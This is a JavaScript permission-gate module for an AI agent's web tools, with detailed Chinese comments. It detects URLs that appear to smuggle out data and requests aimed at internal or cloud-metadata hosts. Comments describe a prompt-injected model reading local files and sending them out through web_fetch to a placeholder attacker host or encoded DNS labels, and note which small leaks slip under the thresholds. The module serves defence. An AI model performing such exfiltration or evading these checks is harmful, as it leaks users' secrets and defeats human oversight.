'use strict';
const { URL } = require('node:url');

const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300, pathChars: 300, hostChars: 100, urlChars: 1024 });
// 第三波(复核 #3):browser_open(原生与 ACC 的同名工具)= 把网址交给浏览器去 GET,ACC 的 fetch 同理;裸名匹配,mcp__server__ 前缀已被 webPayloadReason 剥掉。
// (ACC 的 browser_navigate 只有 back / forward / reload,没有网址入参,不在此列;管家的 steward_web_fetch / steward_web_search 不走本闸,见 13l。)
const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download', 'browser_open', 'fetch']);
const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
function webLooksEncoded(text) {
  const t = String(text == null ? '' : text);
  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
  if (t.length < n) return false;
  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
  for (const run of runs) {
    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
    const seps = (run.match(/[-_]/g) || []).length;
    if (seps * 8 > run.length) continue;
    return true;
  }
  return false;
}
// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
function webSafeDecode(s) {
  const raw = String(s == null ? '' : s);
  try { return decodeURIComponent(raw); } catch { return raw; }
}
// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
function webUrlPayloadReason(url) {
  const s = String(url == null ? '' : url).trim();
  if (!s) return '';
  const hashAt = s.indexOf('#');
  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
  const qAt = noHash.indexOf('?');
  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
  if (s.length > WEB_PAYLOAD_LIMITS.urlChars) return 'url_long';
  if (webSafeDecode(query).length + webSafeDecode(frag).length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  const slashAt = afterScheme.indexOf('/');
  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
  // 用户信息段:带口令(`user:pass@`)或长到能装数据(> 32 字符)一律问;`http://user@intranet.corp:8080/…` 这种只有短用户名的内网写法不算(既有零误伤样本)。
  const atAt = hostPort.lastIndexOf('@');
  if (atAt >= 0) { const userinfo = hostPort.slice(0, atAt); if (userinfo.length > 32 || userinfo.includes(':')) return 'userinfo'; }
  const host = (atAt >= 0 ? hostPort.slice(atAt + 1) : hostPort).replace(/:\d*$/, '');
  if (host.length > WEB_PAYLOAD_LIMITS.hostChars) return 'host_long';
  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
  if (webSafeDecode(pathPart).length > WEB_PAYLOAD_LIMITS.pathChars) return 'path_long';
  const values = [];
  for (const pair of query.split('&')) {
    if (!pair) continue;
    const eq = pair.indexOf('=');
    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
  }
  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
  // 第三波(复核 #7):`#diff-<64 位 hex>`(GitHub 的 diff 锚点)与 `sha256-<64 位 hex>` / `sha256:<64 位 hex>`(镜像 / 包的摘要)恰好 64 位 hex,是日常网址里
  // 仅有的几种「像编码」的正常写法;只摘掉【恰好 64 位】的这两种前缀形态再判(128 位 hex 之类仍命中),整体长度另有 pathChars / urlChars 兜着。
  const withoutDigests = piece => piece.replace(/(?:sha256[-:]|diff-)[0-9a-fA-F]{64}(?![0-9a-fA-F])/gi, '');
  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)].map(withoutDigests);
  if (pieces.some(webLooksEncoded)) return 'encoded_run';
  return '';
}
// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
function webPayloadReason(toolName, input) {
  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
    const q = String(input.query == null ? '' : input.query);
    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
    return '';
  }
  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
  return '';
}
// 3.0 收口走查(第四波):http_request 指向回环 / 内网 / 链路本地(含 169.254.169.254 云元数据)时返回 'internal_target'。
// http_request 是「调本机 / 内网 API」用的,不做 SSRF 拦截(那是 web_fetch / http_download 的事);修前它在智能自动档只要不像载荷就
// 免确认,被网页注入的模型可以 GET 本机其它服务、元数据端点,乃至如意自己的会话接口(token-browser 对无 Origin 的回环请求免 token)。
// 判据:先用 WHATWG URL 规范化主机(0x7f.1 / 2130706433 / 0177.0.0.1 / ::ffff:7f00:1 都还原成标准写法),再交 04h 的本机 / 局域网判据。

function createNativeToolApproval({ network, steward }) {
  const { providerBaseIsLocalOrLan } = network;
  const {
    stewardAutoAskIndirect, stewardAutoAskScanIncomplete, stewardAutoAskSensitiveKind,
    stewardToolPermanentlyExempt,
  } = steward;

  // Decide gate for a tool call given the permission mode. Returns 'allow' | 'ask' | 'block'.
  // 117m-A1(用户第六轮走查②「我已经默认线程全自动了,还是会有很多要求权限」):`auto` 档的 exec 分支
  // 从「一律 ask」改成「高风险才 ask」。修前 `auto` 只放行 edit 档,exec 落到末尾的 `return 'ask'` ——
  // 于是三处界面都把它叫「全自动」、管家壳的档位说明写「不再问你」,而线程每一步 script_run /
  // http_request 仍旧弹权限,进收件箱、管家再起一个回合去「代批」(真机日志里 11 条
  // intervention source:"steward_decision" action:"allow",两分钟一条,把每小时回合额度全吃光)。
  // 高风险判据【复用既有单点】stewardToolPermanentlyExempt(06i):工具名正则 + 命令文本正则两道,
  // 覆盖对外发送/支付/安装卸载/系统设置注册表/关机格式化/删除/git push。不另起一套判据 —— 那条
  // 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
  // toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
  // 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
  // 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
  // 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
  // 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
  //   · 网址的查询串 + fragment 总长 > 256;
  //   · 任一查询参数的值(解码后)> 128;
  //   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
  //   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
  //   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
  // 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
  // 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
  // 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
  // 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
  // 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
  // 第三波(复核 #2 / #7):另加三条整体长度判据 —— pathChars(路径【解码后】总长)、hostChars(主机名总长)、urlChars(整条网址原长);
  // 查询串 / fragment 的 256 改按【解码后】计(中文搜索词一个字符编码成 9 个字符,30 个汉字就超了);用户信息段(`user:pass@`)一律问
  // (Node 会把它发成 Authorization 头 —— 无提示外传通道;web_fetch 没有任何理由带凭据)。阈值依据:真实网址路径解码后极少过 200,
  // 合法主机名几乎不超过 70(codespaces / vercel 预览域 ~60),整条网址过 1024 已超出多数服务端的 URL 上限。
  function httpRequestInternalTargetReason(toolName, input) {
    const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
    if (bare !== 'http_request' || !input || typeof input !== 'object' || Array.isArray(input)) return '';
    let host = '';
    try { host = new URL(String(input.url == null ? '' : input.url).trim()).host; } catch { return ''; }
    return host && providerBaseIsLocalOrLan('http://' + host) ? 'internal_target' : '';
  }
  function nativeToolGate(mode, tier, toolName, input) {
    // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
    if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
    // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
    // 第三波(复核):载荷这一问只把本来的 allow 升成 ask,【不】把 block 放宽成 ask —— plan / dontAsk 档里本来就被挡的 exec / edit 工具(http_request / browser_open 等)带长网址仍是 block。
    const payloadAsk = toolName && webPayloadReason(toolName, input) ? 'ask' : 'allow';
    if (tier === 'read') return payloadAsk;
    if (mode === 'plan' || mode === 'dontAsk') return 'block';
    // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
    // allow edit-tier (low-risk, reversible) and prompt for exec-tier.
    if (mode === 'auto' && tier === 'edit') return payloadAsk;
    if (mode === 'acceptEdits' && tier === 'edit') return payloadAsk;
    if (mode === 'auto') {
      if (!toolName) return 'ask';                                    // 调用方没给名字 = 保守问
      // 2026-10:命令是拼出来 / 编码出来 / 求值出来的(强信号,06i stewardAutoAskIndirect)也停下来问 ——
      // 字面量判据看不穿它真正要跑什么。管家对这一类不代批(13l),只能用户亲自按。
      // 安全走查 S2:网络外发与读数据根密钥文件(06i stewardAutoAskSensitiveKind)同样停下来问;命令类工具才扫,编排类的任务描述文字不扫。
      // 第三波(复核 #4):摊平文本超出扫描窗口的(窗口之后没人看过)同样问 —— 见 06i stewardAutoAskScanIncomplete。
      return (payloadAsk === 'ask' || stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input) || stewardAutoAskSensitiveKind(toolName, input) !== ''
        || stewardAutoAskScanIncomplete(toolName, input) || httpRequestInternalTargetReason(toolName, input) !== '') ? 'ask' : 'allow';
    }
    return 'ask';
  }

  return { httpRequestInternalTargetReason, nativeToolGate };
}

module.exports = { createNativeToolApproval, webPayloadReason, webUrlPayloadReason };
